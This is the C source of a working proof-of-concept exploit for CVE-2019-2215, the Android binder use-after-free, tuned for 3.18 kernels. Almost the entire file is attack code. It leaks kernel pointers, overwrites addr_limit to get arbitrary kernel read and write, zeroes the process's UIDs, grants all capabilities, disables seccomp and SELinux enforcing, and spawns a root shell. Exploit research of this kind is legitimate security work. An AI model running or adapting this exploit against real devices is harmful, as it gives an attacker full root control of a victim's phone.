/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 * Some stuff from Grant Hernandez to achieve root (Oct 15th 2019)
 * Modified by Alexander R. Pruss for 3.18 kernels where WAITQUEUE_OFFSET is 0x98
 *
 * October 2019
*/

// $ uname -a
// Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
#define OFFSET__thread_info__flags 0x000
#define OFFSET__task_struct__stack 0x008
#define OFFSET__cred__uid 0x004
#define OFFSET__cred__securebits 0x024
#define OFFSET__cred__cap_permitted 0x030
#define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
#define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)

//Not needed, but saved for future use; the offsets are for LGV20 LS998
//#define OFFSET__task_struct__seccomp 0x9b0 
//#define OFFSET__cred__user_ns 0x088 // if you define this, the first run might be a little faster
//#define OFFSET__task_struct__cred 0x550
//#define OFFSET__cred__security 0x078
//#define OFFSET__cred__cap_inheritable 0x028
//#define OFFSET__cred__cap_ambient 0x048
//#define OFFSET__task_struct__mm 0x308


#define _GNU_SOURCE
#include <time.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#define DELAY_USEC 500000

#define MIN(x, y) ((x) < (y) ? (x) : (y))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x188
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET (0x98)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
#define UAF_SPINLOCK 0x10001
#define PAGE 0x1000
#define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8

int quiet = 0;

void message(char *fmt, ...)
{
    if (quiet)
        return;
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    putchar('\n');
}

void error(char* fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, ": %s\n", errno ? strerror(errno) : "error");
    exit(1);
}

unsigned long kernel_read_ulong(unsigned long kaddr);

void hexdump_memory(void *_buf, size_t byte_count)
{
    unsigned char *buf = _buf;
    unsigned long byte_offset_start = 0;
    if (byte_count % 16)
        error( "hexdump_memory called with non-full line");
    for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
         byte_offset += 16)
    {
        char line[1000];
        char *linep = line;
        linep += sprintf(linep, "%08lx  ", byte_offset);
        for (int i = 0; i < 16; i++)
        {
            linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
        }
        linep += sprintf(linep, " |");
        for (int i = 0; i < 16; i++)
        {
            char c = buf[byte_offset + i];
            if (isalnum(c) || ispunct(c) || c == ' ')
            {
                *(linep++) = c;
            }
            else
            {
                *(linep++) = '.';
            }
        }
        linep += sprintf(linep, "|");
        puts(line);
    }
}

int epfd;

int binder_fd;

unsigned long iovec_size(struct iovec *iov, int n)
{
    unsigned long sum = 0;
    for (int i = 0; i < n; i++)
        sum += iov[i].iov_len;
    return sum;
}

unsigned long iovec_max_size(struct iovec *iov, int n)
{
    unsigned long m = 0;
    for (int i = 0; i < n; i++)
    {
        if (iov[i].iov_len > m)
            m = iov[i].iov_len;
    }
    return m;
}

int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
{
    int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
    char *dummyBuffer = malloc(dummyBufferSize);
    if (dummyBuffer == NULL)
        error( "allocating dummyBuffer");

    memset(dummyBuffer, 0, dummyBufferSize);

    message("PARENT: clobbering at 0x%lx", payloadAddress);

    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error( "epoll_add");

    unsigned long testDatum = 0;
    unsigned long const testValue = 0xABCDDEADBEEF1234ul;

    struct iovec iovec_array[IOVEC_ARRAY_SZ];
    memset(iovec_array, 0, sizeof(iovec_array));

    const unsigned SECOND_WRITE_CHUNK_IOVEC_ITEMS = 3;

    unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS * 2] = {
        (unsigned long)dummyBuffer,
        /* iov_base (currently in use) */ // wq->task_list->next
            SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10,
        /* iov_len (currently in use) */ // wq->task_list->prev

        payloadAddress, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
        payloadLength,

        (unsigned long)&testDatum,
        sizeof(testDatum),
    };

    int delta = (UAF_SPINLOCK + sizeof(second_write_chunk)) % PAGE;
    int paddingSize = delta == 0 ? 0 : PAGE - delta;

    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                              // spinlock: will turn to UAF_SPINLOCK
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = second_write_chunk;        // wq->task_list->next: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = dummyBuffer;               // stuff from this point will be overwritten and/or ignored
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_len = payloadLength;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_len = sizeof(testDatum);
    int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);

    int pipes[2];
    pipe(pipes);
    if ((fcntl(pipes[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");
    if ((fcntl(pipes[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error( "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        char *f = malloc(totalLength);
        if (f == NULL)
            error( "Allocating memory");
        memset(f, 0, paddingSize + UAF_SPINLOCK);
        unsigned long pos = paddingSize + UAF_SPINLOCK;
        memcpy(f + pos, second_write_chunk, sizeof(second_write_chunk));
        pos += sizeof(second_write_chunk);
        memcpy(f + pos, src, payloadLength);
        pos += payloadLength;
        memcpy(f + pos, &testValue, sizeof(testDatum));
        pos += sizeof(testDatum);
        write(pipes[1], f, pos);
        message("CHILD: wrote %lu", pos);
        close(pipes[1]);
        close(pipes[0]);
        exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    int b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ);

    message("PARENT: readv returns %d, expected %d", b, totalLength);

    if (testDatum != testValue)
        error( "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
    else
        message("PARENT: Clobbering test passed.");

    free(dummyBuffer);
    close(pipes[0]);
    close(pipes[1]);

    return testDatum != testValue;
}

void leak_data(void *leakBuffer, int leakAmount,
               unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
               unsigned long *task_struct_ptr_p, unsigned long *kstack_p)
{
    unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
    unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough

    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error( "epoll_add");

    struct iovec iovec_array[IOVEC_ARRAY_SZ];

    memset(iovec_array, 0, sizeof(iovec_array));

    int delta = (UAF_SPINLOCK + minimumLeak) % PAGE;
    int paddingSize = (delta == 0 ? 0 : PAGE - delta) + PAGE;

    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                                /* spinlock: will turn to UAF_SPINLOCK */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (unsigned long *)0xDEADBEEF; /* wq->task_list->next */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = adjLeakAmount;                /* wq->task_list->prev */
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long *)0xDEADBEEF; // we shouldn't get to here
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = extraLeakAmount + UAF_SPINLOCK + 8;
    unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned char *dataBuffer = malloc(maxLength);

    if (dataBuffer == NULL)
        error( "Allocating %ld bytes", maxLength);

    for (int i = 0; i < IOVEC_ARRAY_SZ; i++)
        if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
            iovec_array[i].iov_base = dataBuffer;

    int b;
    int pipefd[2];
    int leakPipe[2];
    if (pipe(pipefd))
        error( "pipe");
    if (pipe(leakPipe))
        err(2, "pipe");
    if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");
    if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error( "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        unsigned long size1 = paddingSize + UAF_SPINLOCK + minimumLeak;
        message("CHILD: initial portion length 0x%lx", size1);
        char buffer[size1];
        memset(buffer, 0, size1);
        if (read(pipefd[0], buffer, size1) != size1)
            error( "reading first part of pipe");

        memcpy(dataBuffer, buffer + size1 - minimumLeak, minimumLeak);
        if (memcmp(dataBuffer, dataBuffer + 8, 8))
            error( "Addresses don't match");
        unsigned long addr = 0;
        memcpy(&addr, dataBuffer, 8);
        if (addr == 0)
            error( "bad address");
        unsigned long task_struct_ptr = 0;

        memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
        message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);

        if (extraLeakAmount > 0 || kstack_p != NULL)
        {
            unsigned long extra[6] = {
                addr,
                adjLeakAmount,
                extraLeakAddress,
                extraLeakAmount,
                task_struct_ptr + 8,
                8};
            message("CHILD: clobbering with extra leak structures");
            clobber_data(addr, &extra, sizeof(extra));
            message("CHILD: clobbered");
        }

        errno = 0;
        if (read(pipefd[0], dataBuffer + minimumLeak, adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
            error( "leaking");

        write(leakPipe[1], dataBuffer, adjLeakAmount);

        if (extraLeakAmount > 0)
        {
            message("CHILD: extra leak");
            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount)
                error( "extra leaking");
            write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
            //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
        }
        if (kstack_p != NULL)
        {
            if (read(pipefd[0], dataBuffer, 8) != 8)
                error( "leaking kstack");
            message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
            write(leakPipe[1], dataBuffer, 8);
        }

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakPipe[0]);
        close(leakPipe[1]);
        message("CHILD: Finished write to FIFO.");
        exit(0);
    }
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    message("PARENT: Calling WRITEV");
    errno = 0;
    b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
    message("PARENT: writev() returns 0x%x", (unsigned int)b);
    if (b != totalLength)
        error( "writev() returned wrong value: needed 0x%lx", totalLength);

    message("PARENT: Reading leaked data");

    b = read(leakPipe[0], dataBuffer, adjLeakAmount);
    if (b != adjLeakAmount)
        error( "reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);

    if (leakAmount > 0)
        memcpy(leakBuffer, dataBuffer, leakAmount);

    if (extraLeakAmount != 0)
    {
        message("PARENT: Reading extra leaked data");
        b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
        if (b != extraLeakAmount)
            error( "reading extra leak: read 0x%x needed 0x%x", b, extraLeakAmount);
    }

    if (kstack_p != NULL)
    {
        if (read(leakPipe[0], kstack_p, 8) != 8)
            error( "reading kstack");
    }

    if (task_struct_ptr_p != NULL)
        memcpy(task_struct_ptr_p, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);

    close(pipefd[0]);
    close(pipefd[1]);
    close(leakPipe[0]);
    close(leakPipe[1]);

    int status;
    wait(&status);
    //if (wait(&status) != fork_ret) error( "wait");

    free(dataBuffer);

    message("PARENT: Done with leaking");
}

int kernel_rw_pipe[2];

void reset_kernel_pipes()
{
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    if (pipe(kernel_rw_pipe))
        error( "kernel_rw_pipe");
}

int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], buf, len) != len ||
        read(kernel_rw_pipe[0], (void *)kaddr, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

void kernel_write(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len != raw_kernel_write(kaddr, buf, len))
        error( "error with kernel writing");
}

int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], (void *)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

void kernel_read(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
    if (len != raw_kernel_read(kaddr, buf, len))
        error( "error with kernel reading");
}

unsigned long kernel_read_ulong(unsigned long kaddr)
{
    unsigned long data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}
void kernel_write_ulong(unsigned long kaddr, unsigned long data)
{
    kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uint(unsigned long kaddr, unsigned int data)
{
    kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uchar(unsigned long kaddr, unsigned char data)
{
    kernel_write(kaddr, &data, sizeof(data));
}


// Make the kallsyms module not check for permission to list symbol addresses
int fixKallsymsFormatStrings(unsigned long start)
{
    int found = 0;

    start &= ~(PAGE - 1);

    unsigned long searchTarget;

    memcpy(&searchTarget, "%pK %c %", 8);

    int backwards = 1;
    int forwards = 1;
    int direction = 1;
    unsigned long forwardAddress = start;
    unsigned long backwardAddress = start - PAGE;
    unsigned long page[PAGE / 8];
    
    message("MAIN: searching for kallsyms format strings");

    while ((backwards || forwards) && found < 2)
    {
        unsigned long address = direction > 0 ? forwardAddress : backwardAddress;

        if (address < 0xffffffc000000000ul || address >= 0xffffffd000000000ul || raw_kernel_read(address, page, PAGE) != PAGE)
        {
            if (direction > 0)
                forwards = 0;
            else
                backwards = 0;
        }
        else
        {
            for (int i = 0; i < PAGE / 8; i++)
                if (page[i] == searchTarget)
                {
                    unsigned long a = address + 8 * i;

                    char fmt[16];

                    kernel_read(a, fmt, 16);

                    if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A"))
                    {
                        found++;
                        kernel_write(a, "%p %c %s\t[%s]\x0A", 15);
                        message("MAIN: patching longer version at %lx", a);
                    }
                    else if (!strcmp(fmt, "%pK %c %s\x0A"))
                    {
                        found++;
                        kernel_write(a, "%p %c %s\x0A", 10);
                        message("MAIN: patching shorter version at %lx", a);
                    }

                    if (found >= 2)
                        return 2;
                }
        }

        if (direction > 0)
            forwardAddress += PAGE;
        else
            backwardAddress -= PAGE;

        direction = -direction;

        if (direction < 0 && !backwards)
        {
            direction = 1;
        }
        else if (direction > 0 && !forwards)
        {
            direction = -1;
        }
    }

    return found;
}

unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
{
    char buf[1024];
    errno = 0;
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks == NULL || NULL == fgets(buf, 1024, ks))
        error( "Reading /proc/kallsyms");
    fclose(ks);
    if (strncmp(buf, "0000000000000000", 16) == 0 && 0 == fixKallsymsFormatStrings(pointInKernelMemory))
    {
        error( "Cannnot fix kallsyms format string");
    }
    ks = fopen("/proc/kallsyms", "r");
    unsigned l = strlen(symbol);
    while (NULL != fgets(buf, 1024, ks))
    {
        char *p = buf + 17;
        while (isspace(*p))
            p++;
        p++;
        while (isspace(*p))
            p++;
        if (!strncmp(p, symbol, l) && p[l] == '\x0A')
        {
            unsigned long address;
            sscanf(buf, "%lx", &address);
            fclose(ks);
            return address;
        }
    }
    fclose(ks);
    return 0;
}

int verifyCred(unsigned long cred_ptr) {
    unsigned uid;
    if (cred_ptr < 0xffffff0000000000ul || 4 != raw_kernel_read(cred_ptr+OFFSET__cred__uid, &uid, 4))
        return 0;
    return uid == getuid();
}

int getCredOffset(unsigned char* task_struct_data, char* execName) {
    char taskname[16];
    char* p = strrchr(execName, '/');
    if (p == NULL)
        p = execName;
    else
        p++;
    unsigned n = MIN(strlen(p)+1, 16);
    memcpy(taskname, p, n);
    p[15] = 0; 
    
    for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) 
        if (0 == memcmp(task_struct_data+i, p, n) && verifyCred(*(unsigned long*)(task_struct_data+i-8)))
            return i-8;
        
    errno=0;
    error("Cannot find cred structure");
    return -1;
}

int getSeccompOffset(unsigned char* task_struct_data, unsigned credOffset, unsigned seccompStatus) {
    if (seccompStatus != 2)
        return -1;
    
    unsigned long firstGuess = -1;
    
    for (int i=credOffset&~7; i<PAGE-24; i+=8) {
        struct {
            unsigned long seccomp_status;
            unsigned long seccomp_filter;
            unsigned int parent_exe;
            unsigned int child_exe;
        } *p = (void*)(task_struct_data+i);
        
        if (p->seccomp_status == seccompStatus && ((p->seccomp_filter & 0xFFFFFFFF00000000ul) == 0xFFFFFFC000000000ul)) {
            if (p->child_exe == p->parent_exe + 1) {
                return i;
            }
            else {
                if (firstGuess < 0)
                    firstGuess = i;
            }
        }
    }
    
    return firstGuess;
}

int main(int argc, char **argv)
{
    if (argc >= 2)
        quiet = 1;

    message("MAIN: starting exploit for devices with waitqueue at 0x98");

    if (pipe(kernel_rw_pipe))
        error( "kernel_rw_pipe");

    binder_fd = open("/dev/binder", O_RDONLY);
    epfd = epoll_create(1000);

    unsigned long kstack = 0xDEADBEEFDEADBEEFul;
    unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
    leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack);
    message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
    message("MAIN: stack = %lx", kstack);
    message("MAIN: Clobbering addr_limit");
    unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
    clobber_data(kstack + 8, &src, 8);

    message("MAIN: current->kstack == 0x%lx", kernel_read_ulong(task_struct_ptr + OFFSET__task_struct__stack));

    unsigned long thread_info_ptr = kstack;

    setbuf(stdout, NULL);
    message("MAIN: should have stable kernel R/W now");

    message("MAIN: searching for cred offset in task_struct");
    unsigned char task_struct_data[PAGE+16];
    kernel_read(task_struct_ptr, task_struct_data, PAGE);
        
    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data, argv[0]);
    
    unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);

    message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
    
    for (int i = 0; i < 8; i++)
        kernel_write_uint(cred_ptr + OFFSET__cred__uid + i * 4, 0);

    if (getuid() != 0)
        error( "changing UIDs to 0");

    message("MAIN: UID = 0");

    message("MAIN: enabling capabilities");

    // reset securebits
    kernel_write_uint(cred_ptr + OFFSET__cred__securebits, 0);

    //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_permitted, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_effective, 0x3fffffffffUL);
    kernel_write_ulong(cred_ptr + OFFSET__cred__cap_bset, 0x3fffffffffUL);
    //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);

    int seccompStatus = prctl(PR_GET_SECCOMP);
    message("MAIN: SECCOMP status %d", seccompStatus);
    if (seccompStatus)
    {
        message("MAIN: disabling SECCOMP");
        kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
        // TODO: search for seccomp offset
        int offset__task_struct__seccomp = getSeccompOffset(task_struct_data, offset_task_struct__cred, seccompStatus);
        if (offset__task_struct__seccomp < 0) 
            message("MAIN: **FAIL** cannot find seccomp offset");
        else {
            message("MAIN: seccomp offset %lx", offset__task_struct__seccomp);
            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp, 0);
            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp + 8, 0);
            message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
        }
    }

#ifdef OFFSET__cred__user_ns    
    unsigned long search_base = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
    if (search_base < 0xffffffc000000000ul || search_base >= 0xffffffd000000000ul)
        search_base = 0xffffffc001744b70ul;
#else
#define search_base 0xffffffc000000000ul
#endif

    message("MAIN: search_base = %lx", search_base);

    message("MAIN: searching for selinux_enforcing");
    unsigned long selinux_enforcing = findSymbol(search_base, "selinux_enforcing");
    if (selinux_enforcing == 0)
        message("MAIN: **FAIL** cannot find selinux_enforcing symbol");
    else
    {
        message("MAIN: found selinux_enforcing at %lx", selinux_enforcing);
        kernel_write_uint(selinux_enforcing, 0);
        message("MAIN: disabled selinux enforcing");
    }

    if (argc == 2)
    {
        execlp("sh", "sh", "-c", argv[1], (char *)0);
    }
    else {
        message("MAIN: popping out root shell");
        execlp("sh", "sh", (char*)0);
    }

    exit(0);
}
